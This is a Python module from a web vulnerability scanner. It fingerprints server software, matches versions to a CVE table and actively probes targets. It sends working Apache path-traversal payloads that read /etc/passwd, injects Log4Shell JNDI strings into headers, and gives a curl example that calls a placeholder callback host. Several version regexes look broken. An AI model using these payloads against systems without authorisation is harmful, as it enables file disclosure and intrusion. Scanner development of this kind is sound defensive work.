import re
from urllib.parse import urljoin

from scanner.core import Finding, Severity, ScanSession
from scanner.log import logger

VULN_DB = {
    "apache": [
        ("CVE-2021-41773", r"^2\.4\.49$", 7.5, "HIGH",
         "Path traversal and file disclosure in Apache HTTP Server 2.4.49", True),
        ("CVE-2021-42013", r"^2\.4\.(49|50)$", 9.8, "CRITICAL",
         "Path traversal and RCE in Apache HTTP Server 2.4.49-2.4.50 (incomplete fix for CVE-2021-41773)", True),
        ("CVE-2021-44790", r"^2\.4\.(5[01]|4[0-9])$", 9.8, "CRITICAL",
         "Buffer overflow in mod_lua multipart parser in Apache HTTP Server <2.4.52", True),
        ("CVE-2022-22720", r"^2\.4\.(5[0-2]|4[0-9])$", 9.8, "CRITICAL",
         "HTTP request smuggling in Apache HTTP Server <2.4.53", False),
        ("CVE-2022-31813", r"^2\.4\.(5[0-3]|4[0-9])$", 9.8, "CRITICAL",
         "mod_proxy X-Forwarded-For bypass in Apache HTTP Server <2.4.54", False),
        ("CVE-2023-25690", r"^2\.4\.(5[0-5]|4[0-9])$", 9.8, "CRITICAL",
         "HTTP request smuggling in Apache mod_proxy <2.4.56", True),
    ],
    "nginx": [
        ("CVE-2021-23017", r"^(0\.|1\.([0-9]\.|1[0-9]\.|20\.[0-1]$))", 9.4, "CRITICAL",
         "DNS resolver off-by-one heap write vulnerability in Nginx <1.20.1", True),
        ("CVE-2022-41741", r"^1\.(2[0-2]\.|23\.0$)", 7.8, "HIGH",
         "Memory corruption in Nginx mp4 module <1.23.2", False),
        ("CVE-2022-41742", r"^1\.(2[0-2]\.|23\.0$)", 7.5, "HIGH",
         "Memory disclosure in Nginx mp4 module <1.23.2", False),
    ],
    "php": [
        ("CVE-2019-11043", r"^7\.[12]\.", 9.8, "CRITICAL",
         "PHP-FPM RCE via env_path_info underflow (PHP 7.1.x-7.3.x)", True),
        ("CVE-2023-3824", r"^8\.[01]\.", 9.8, "CRITICAL",
         "Buffer overflow in PHP phar reading (PHP <8.0.30, <8.1.22)", True),
        ("CVE-2024-4577", r"^8\.[0-3]\.", 9.8, "CRITICAL",
         "PHP CGI argument injection on Windows (PHP <8.1.29, <8.2.20, <8.3.8)", True),
        ("CVE-2022-31625", r"^(7\.4|8\.0)\.", 8.1, "HIGH",
         "Use-after-free in pg_query_params (PHP 7.4.x, 8.0.x)", False),
    ],
    "wordpress": [
        ("CVE-2022-21661", r"^5\.[0-8]\.", 7.5, "HIGH",
         "SQL injection via WP_Query in WordPress <5.8.3", True),
        ("CVE-2023-2745", r"^6\.[0-2]\.", 5.4, "MEDIUM",
         "Directory traversal in WordPress <6.2.1", False),
        ("CVE-2022-43504", r"^(5\.|6\.0)", 5.3, "MEDIUM",
         "CSRF bypass in WordPress <6.0.3", False),
    ],
    "jquery": [
        ("CVE-2020-11022", r"^[12]\.|^3\.0\.|^3\.1\.|^3\.2\.|^3\.3\.|^3\.4\.", 6.1, "MEDIUM",
         "XSS via passing HTML from untrusted input to jQuery DOM manipulation (jQuery <3.5.0)", True),
        ("CVE-2020-11023", r"^[12]\.|^3\.0\.|^3\.1\.|^3\.2\.|^3\.3\.|^3\.4\.", 6.1, "MEDIUM",
         "XSS via passing HTML containing <option> elements to jQuery (jQuery <3.5.0)", True),
        ("CVE-2019-11358", r"^[12]\.|^3\.0\.|^3\.1\.|^3\.2\.|^3\.3\.", 6.1, "MEDIUM",
         "Prototype pollution in jQuery.extend (jQuery <3.4.0)", True),
    ],
    "openssl": [
        ("CVE-2022-0778", r"^(1\.0\.|1\.1\.1[a-n]$|3\.0\.[0-1]$)", 7.5, "HIGH",
         "Infinite loop in BN_mod_sqrt causing DoS in OpenSSL", True),
        ("CVE-2022-3602", r"^3\.0\.[0-6]$", 7.5, "HIGH",
         "X.509 email address buffer overflow in OpenSSL 3.0.x <3.0.7 (Spooky SSL)", True),
        ("CVE-2023-0286", r"^(1\.0\.|1\.1\.1[a-t]$|3\.0\.[0-7]$)", 7.4, "HIGH",
         "X.400 address type confusion in OpenSSL", False),
    ],
    "tomcat": [
        ("CVE-2022-42252", r"^(8\.5\.[0-7][0-9]$|9\.0\.[0-5][0-9]$|10\.0\.", 7.5, "HIGH",
         "Request smuggling via invalid Content-Length in Apache Tomcat", False),
        ("CVE-2023-28708", r"^(8\.5\.[0-8][0-5]|9\.0\.[0-7][0-1]|10\.1\.[0-4]$)", 7.5, "HIGH",
         "Information disclosure via missing Secure attribute on session cookie in Tomcat", False),
        ("CVE-2024-21733", r"^(8\.5\.[0-9][0-7]|9\.0\.[0-8][0-3])", 5.3, "MEDIUM",
         "Information leak via incomplete POST requests in Tomcat", False),
    ],
    "spring": [
        ("CVE-2022-22965", r".*", 9.8, "CRITICAL",
         "Spring4Shell: RCE via data binding on JDK 9+ with Apache Tomcat", True),
        ("CVE-2022-22963", r".*", 9.8, "CRITICAL",
         "RCE in Spring Cloud Function via routing-expression header", True),
    ],
    "log4j": [
        ("CVE-2021-44228", r"^2\.(0|1[0-4]($|\.))", 10.0, "CRITICAL",
         "Log4Shell: RCE via JNDI lookup injection in Apache Log4j2 <2.15.0", True),
        ("CVE-2021-45046", r"^2\.1[5-5]($|\.)", 9.0, "CRITICAL",
         "Incomplete fix for Log4Shell, RCE in certain non-default configs in Log4j2 <2.16.0", True),
        ("CVE-2021-45105", r"^2\.1[0-6]($|\.)", 7.5, "HIGH",
         "DoS via uncontrolled recursion in Log4j2 lookup evaluation <2.17.0", True),
    ],
}

PROBE_PATHS = [
    ("/wp-login.php", "wordpress"),
    ("/wp-admin/", "wordpress"),
    ("/administrator/", "joomla"),
    ("/user/login", "drupal"),
    ("/manager/html", "tomcat"),
    ("/actuator/info", "spring"),
    ("/actuator/health", "spring"),
    ("/elmah.axd", "asp.net"),
    ("/server-status", "apache"),
    ("/server-info", "apache"),
]

VERSION_PATTERNS = [
    (r'<meta[^>]*generator[^>]*content=["\']WordPress\s+([\d.]+)', "wordpress"),
    (r'<meta[^>]*generator[^>]*content=["\']Joomla!\s+([\d.]+)', "joomla"),
    (r'<meta[^>]*generator[^>]*content=["\']Drupal\s+([\d.]+)', "drupal"),
    (r'jquery[.-]?([\d.]+)(?:\.min)?\.js', "jquery"),
    (r'jquery/?([\d.]+)', "jquery"),
    (r'jQuery\s+v?([\d.]+)', "jquery"),
    (r'Bootstrap\s+v?([\d.]+)', "bootstrap"),
    (r'<meta[^>]*generator[^>]*content=["\']([^"\']+)', "_generator"),
]

_SW_ALIASES = {
    "apache": lambda n: "apache" in n and ("httpd" in n or "http server" in n or "/" in n),
    "nginx": lambda n: "nginx" in n,
    "php": lambda n: "php" in n,
    "wordpress": lambda n: "wordpress" in n or n == "wp",
    "jquery": lambda n: "jquery" in n,
    "openssl": lambda n: "openssl" in n,
    "tomcat": lambda n: "tomcat" in n,
    "spring": lambda n: "spring" in n,
    "log4j": lambda n: "log4j" in n,
}


def _normalize_software(name):
    name = name.lower().strip()
    for key, check in _SW_ALIASES.items():
        if check(name):
            return key
    return name


def _extract_version(value):
    match = re.search(r'[\d]+(?:\.[\d]+)+', value)
    return match.group(0) if match else ""


def _check_vuln_db(software, version):
    key = _normalize_software(software)
    if key not in VULN_DB:
        return []
    return [
        (cve_id, cvss, sev, summary, exploit)
        for cve_id, ver_regex, cvss, sev, summary, exploit in VULN_DB[key]
        if version and re.match(ver_regex, version)
    ]


def _build_curl(method, url, headers=None):
    from scanner.core import build_curl
    return build_curl(method, url, headers=headers)


def _fingerprint_from_headers(resp):
    detected = {}
    server = resp.headers.get("Server", "")
    if server:
        for pattern, sw in [
            (r'Apache/([\d.]+)', "apache"),
            (r'nginx/([\d.]+)', "nginx"),
            (r'Microsoft-IIS/([\d.]+)', "iis"),
            (r'Tomcat/([\d.]+)', "tomcat"),
            (r'LiteSpeed', "litespeed"),
        ]:
            m = re.search(pattern, server, re.IGNORECASE)
            if m:
                detected[sw] = m.group(1) if m.lastindex else ""

    powered_by = resp.headers.get("X-Powered-By", "")
    if powered_by:
        for pattern, sw in [
            (r'PHP/([\d.]+)', "php"),
            (r'ASP\.NET', "asp.net"),
            (r'Express', "express"),
            (r'Servlet/([\d.]+)', "servlet"),
        ]:
            m = re.search(pattern, powered_by, re.IGNORECASE)
            if m:
                detected[sw] = m.group(1) if m.lastindex else ""

    m = re.search(r'OpenSSL/([\d.]+\w*)', server)
    if m:
        detected["openssl"] = m.group(1)

    return detected


def _fingerprint_from_body(body):
    detected = {}
    for pattern, sw in VERSION_PATTERNS:
        m = re.search(pattern, body, re.IGNORECASE)
        if m:
            if sw == "_generator":
                gen = m.group(1).strip()
                sw_name = gen.split()[0].lower() if gen else ""
                if sw_name:
                    detected[sw_name] = _extract_version(gen)
            else:
                detected[sw] = m.group(1)
    return detected


def _fingerprint_from_cookies(cookies):
    detected = {}
    cookie_map = {
        "PHPSESSID": "php",
        "JSESSIONID": "tomcat",
        "ASP.NET_SessionId": "asp.net",
        "laravel_session": "laravel",
        "csrftoken": "django",
        "wp-settings": "wordpress",
    }
    for cookie in cookies:
        name = cookie.name if hasattr(cookie, 'name') else str(cookie)
        for prefix, sw in cookie_map.items():
            if name.startswith(prefix):
                detected[sw] = ""
    return detected


def _test_cve_2021_41773(session):
    traversal_paths = [
        "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
        "/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
        "/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd",
    ]
    for path in traversal_paths:
        url = urljoin(session.config.target, path)
        resp = session.get(url, allow_redirects=False)
        if resp and resp.status_code == 200 and re.search(r'root:.*:0:0:', resp.text):
            return True
    return False


def _test_log4shell_indicators(session):
    """Returns list of headers showing anomalous behavior with JNDI payloads."""
    indicators = []
    test_payload = "${jndi:ldap://127.0.0.1/test}"
    log4j_headers = ["X-Forwarded-For", "User-Agent", "Referer", "X-Api-Version", "Accept-Language"]

    baseline = session.get(session.config.target)
    if not baseline:
        return []
    baseline_status = baseline.status_code

    for header in log4j_headers:
        resp = session.get(session.config.target, headers={header: test_payload})
        if resp is None:
            indicators.append((header, "connection_error"))
        elif resp.status_code >= 500 and baseline_status < 500:
            indicators.append((header, "status_{s}".format(s=resp.status_code)))
    return indicators


def run(session: ScanSession) -> None:
    logger.info("\n[*] Checking for known CVEs and vulnerabilities...")

    target = session.config.target
    resp = session.get(target)
    if not resp:
        logger.warning(" [-] Could not reach target, skipping CVE checks")
        return

    all_detected = {}
    all_detected.update(_fingerprint_from_headers(resp))
    all_detected.update(_fingerprint_from_body(resp.text))
    for sw, ver in _fingerprint_from_cookies(resp.cookies).items():
        if sw not in all_detected:
            all_detected[sw] = ver

    for path, tech in PROBE_PATHS:
        url = urljoin(target, path)
        probe_resp = session.get(url, allow_redirects=False)
        if probe_resp and probe_resp.status_code in (200, 301, 302, 401, 403):
            if tech not in all_detected:
                all_detected[tech] = ""
            if probe_resp.status_code == 200:
                for sw, ver in _fingerprint_from_body(probe_resp.text).items():
                    if ver and (sw not in all_detected or not all_detected[sw]):
                        all_detected[sw] = ver

    if all_detected:
        tech_str = ", ".join(
            "{sw} {ver}".format(sw=sw, ver=ver) if ver else sw
            for sw, ver in all_detected.items()
        )
        logger.info(" [+] Detected technologies: {tech}".format(tech=tech_str))
    else:
        logger.warning(" [-] No technologies fingerprinted")

    # Match detected tech against vuln DB
    for software, version in all_detected.items():
        for cve_id, cvss, sev_str, summary, exploit_avail in _check_vuln_db(software, version):
            severity = {"CRITICAL": Severity.CRITICAL, "HIGH": Severity.HIGH}.get(sev_str, Severity.MEDIUM)
            exploit_note = "Public exploits are available." if exploit_avail else "No public exploit known at time of database entry."

            session.add_finding(Finding(
                title="{cve}: {summary}".format(cve=cve_id, summary=summary),
                severity=severity,
                description=(
                    "The target appears to run {sw} version {ver}. "
                    "This version is affected by {cve} (CVSS {cvss}). {summary}. {note}"
                ).format(sw=software, ver=version or "unknown", cve=cve_id, cvss=cvss,
                         summary=summary, note=exploit_note),
                evidence="Detected: {sw}/{ver} via header/body fingerprinting".format(
                    sw=software, ver=version or "unversioned"),
                remediation="Update {sw} to the latest stable version. Review {cve} advisory for specific patched versions.".format(
                    sw=software, cve=cve_id),
                url=target,
                module="cve_check",
                cwe="CWE-1035",
                confirmed=False,
                detection_method="Version fingerprinting matched against built-in CVE database (CVSS {cvss})".format(cvss=cvss),
                curl_command=_build_curl("GET", target),
                reproduction_steps=(
                    "1. Send GET request to {target}\n"
                    "2. Observe Server/X-Powered-By headers or body content indicating {sw} {ver}\n"
                    "3. Cross-reference version against {cve} affected versions\n"
                    "4. {action}"
                ).format(target=target, sw=software, ver=version, cve=cve_id,
                         action="Exploit code is publicly available - verify exploitability" if exploit_avail
                         else "Verify by checking installed version on the server"),
                developer_fix=(
                    "Update {sw} to the latest patched version. "
                    "Remove version information from Server and X-Powered-By headers to reduce exposure. "
                    "Implement a vulnerability management process for tracking CVEs in dependencies."
                ).format(sw=software),
                references=(
                    "https://nvd.nist.gov/vuln/detail/{cve}, "
                    "https://cve.mitre.org/cgi-bin/cvename.cgi?name={cve}"
                ).format(cve=cve_id),
                affected_component="{sw} {ver}".format(sw=software, ver=version),
            ))

    # Active testing for Apache path traversal
    if "apache" in all_detected:
        if _test_cve_2021_41773(session):
            traversal_url = urljoin(target, "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd")
            session.add_finding(Finding(
                title="CVE-2021-41773: Apache Path Traversal - CONFIRMED",
                severity=Severity.CRITICAL,
                description=(
                    "The Apache HTTP Server is vulnerable to path traversal via CVE-2021-41773. "
                    "An attacker can read arbitrary files on the server outside the document root. "
                    "If mod_cgi is enabled, this can lead to remote code execution."
                ),
                evidence="Successfully read /etc/passwd via path traversal payload",
                remediation="Immediately update Apache HTTP Server to 2.4.51 or later. As a workaround, ensure 'Require all denied' is set for filesystem directories outside the document root.",
                url=traversal_url,
                module="cve_check",
                cwe="CWE-22",
                confirmed=True,
                payload="/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
                detection_method="Active exploitation: sent path traversal payload and verified /etc/passwd content in response",
                curl_command=_build_curl("GET", traversal_url),
                reproduction_steps=(
                    "1. Send: curl -k '{url}'\n"
                    "2. Observe /etc/passwd content in the response body\n"
                    "3. Test with /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh for RCE if mod_cgi is enabled"
                ).format(url=traversal_url),
                developer_fix=(
                    "1. Update Apache to version 2.4.51 or later immediately\n"
                    "2. Add 'Require all denied' for directories outside document root in httpd.conf\n"
                    "3. Disable mod_cgi if not required\n"
                    "4. Implement a WAF rule to block encoded path traversal sequences"
                ),
                references=(
                    "https://nvd.nist.gov/vuln/detail/CVE-2021-41773, "
                    "https://httpd.apache.org/security/vulnerabilities_24.html, "
                    "https://attackerkb.com/topics/1RltOPCYqE/cve-2021-41773"
                ),
                affected_component="Apache {ver}".format(ver=all_detected.get("apache", "")),
            ))

    # Log4Shell indicator testing
    log4j_indicators = _test_log4shell_indicators(session)
    if log4j_indicators:
        affected_headers = ", ".join("{h} ({r})".format(h=h, r=reason) for h, reason in log4j_indicators)
        session.add_finding(Finding(
            title="Potential Log4Shell (CVE-2021-44228) Indicators Detected",
            severity=Severity.HIGH,
            description=(
                "The server exhibited anomalous behavior when JNDI lookup strings were "
                "injected in HTTP headers, which may indicate vulnerability to Log4Shell "
                "(CVE-2021-44228). Affected headers: {headers}. "
                "This finding requires manual verification with an out-of-band callback server."
            ).format(headers=affected_headers),
            evidence="Anomalous responses when injecting JNDI payloads in headers: {headers}".format(headers=affected_headers),
            remediation=(
                "Update Log4j to version 2.17.1 or later. As immediate mitigations: "
                "set log4j2.formatMsgNoLookups=true, remove JndiLookup class from classpath, "
                "or upgrade to Java 8u191+ which restricts LDAP JNDI by default."
            ),
            url=target,
            module="cve_check",
            cwe="CWE-917",
            confirmed=False,
            detection_method="Injected JNDI lookup strings in HTTP headers and observed anomalous server behavior (errors/timeouts vs baseline)",
            curl_command=_build_curl("GET", target, {"X-Forwarded-For": "${jndi:ldap://CALLBACK_SERVER/test}"}),
            reproduction_steps=(
                "1. Set up an out-of-band callback server (e.g., Burp Collaborator, interact.sh)\n"
                "2. Send: curl -k -H 'X-Forwarded-For: ${{jndi:ldap://YOUR_CALLBACK/test}}' '{target}'\n"
                "3. Repeat with headers: User-Agent, Referer, X-Api-Version\n"
                "4. Monitor callback server for DNS/LDAP connections from the target"
            ).format(target=target),
            developer_fix=(
                "1. Immediately update all Log4j 2.x instances to 2.17.1+\n"
                "2. Set -Dlog4j2.formatMsgNoLookups=true as JVM argument\n"
                "3. Remove the JndiLookup class: zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class\n"
                "4. Implement WAF rules to block ${jndi: patterns in all input\n"
                "5. Audit all Java applications for Log4j usage including transitive dependencies"
            ),
            references=(
                "https://nvd.nist.gov/vuln/detail/CVE-2021-44228, "
                "https://logging.apache.org/log4j/2.x/security.html, "
                "https://www.lunasec.io/docs/blog/log4j-zero-day/"
            ),
            affected_component="Log4j (suspected)",
        ))

    found_count = sum(1 for f in session.findings if f.module == "cve_check")
    logger.info(" [*] CVE check complete: {n} potential vulnerabilities identified".format(n=found_count))
